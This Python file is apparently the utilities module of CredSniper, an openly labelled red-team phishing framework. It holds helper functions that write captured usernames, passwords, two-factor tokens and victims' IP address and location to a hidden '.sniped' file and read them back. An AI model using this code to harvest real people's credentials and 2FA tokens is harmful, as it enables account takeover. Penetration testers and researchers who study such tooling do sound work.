import random
import string
import uuid


def generate_token(size=32):
    return ''.join(random.SystemRandom().choice(
        string.ascii_lowercase + string.ascii_uppercase + string.digits
        ) for _ in range(size)
    )


def store_creds(
    module,
    user,
    password,
    two_factor_token,
    two_factor_type,
    remote_addr,
    city,
    region,
    zip_code
):
    try:
        with open('.sniped','a') as fh:
            cred_id = str(uuid.uuid4())
            fh.write('{},{},{},{},{},{},{},{},{},{}\n'.format(
                cred_id,
                module,
                user,
                password,
                two_factor_token,
                two_factor_type,
                remote_addr,
                city,
                region,
                zip_code
            ))
    except Exception as ex:
        print('Error saving creds: {}'.format(ex))
        pass


def cache_creds(module, username, password):
    try:
        with open('.cache','a+') as fh:
            if username and password:
                fh.write('{},{},{}\n'.format(module, username, password))
    except Exception as ex:
        print(ex)
        pass


def reload_creds(seen):
    creds = {'creds': []}
    try:
        with open('.sniped','r') as fh:
            for cred in fh.read().split('\n'):
                if len(cred) >= 3:
                    cl = cred.split(',')
                    cred_id = cl[0]
                    module = cl[1]
                    user = cl[2]
                    password = cl[3]
                    two_factor_token = cl[4]
                    two_factor_type = cl[5]
                    ip_address = cl[6]
                    city = cl[7]
                    region = cl[8]
                    zip_code = cl[9]
                    
                    add_cred = {
                        'cred_id': cred_id,
                        'module': module,
                        'username': user,
                        'password': password,
                        'two_factor_token': two_factor_token,
                        'two_factor_type': two_factor_type,
                        'seen': True if cred_id in seen else False,
                        'ip_address': ip_address,
                        'city': city,
                        'region': region,
                        'zip_code': zip_code
                    }
                    creds['creds'].append(add_cred)
    except Exception as ex:
        print(ex)
        pass

    return creds


def print_banner():
    print('''
 ..........................................
 ..........................................
 ..........M...............................
 ........N......................... .Z.....
 .......M.......... M++M..........MMMN.....
 ......MMMM......M?======$M .....MMDM......
 .....,...MMD.MM=====IM=====MM  M..........
 ....D .....M=======M..8=======M ..........
 ...M ....M====+===+...DMM==NM===M.........
 ... .....M==+..MM. ..MMMMMM.MM==M.........
 ..Z......M==M..MMM..NMMMMMMN.MM=M.........
 .........M=M MMMMM..MMMMMMMMMMMMM.........
 .........MMMMMMMMMMMMMMMMMMMMMMMM.........
 ....... .MMMMMMMMMMMMMMMMMMMMMMMM.........
 .........MMMM  BLACK HILLS   MMMM.........
 .........MMMM    INFOSEC     MMMM.........
 ..........MMMMMMMMMMMMMMMMMMMMMM .........
 ...........MMMM,M+IOM=MO=MMNMMMMM.........
 ....... M:. ..MMMMMMMMMMMMMM....MM$.......
 ......MM........+MMMMMMMM.........MM .....
 ...................MMMM...................
 ..........................................
 ..........................................
 ..........................................

[*] CredSniper v1 - Mike Felch (@ustayready)
''')
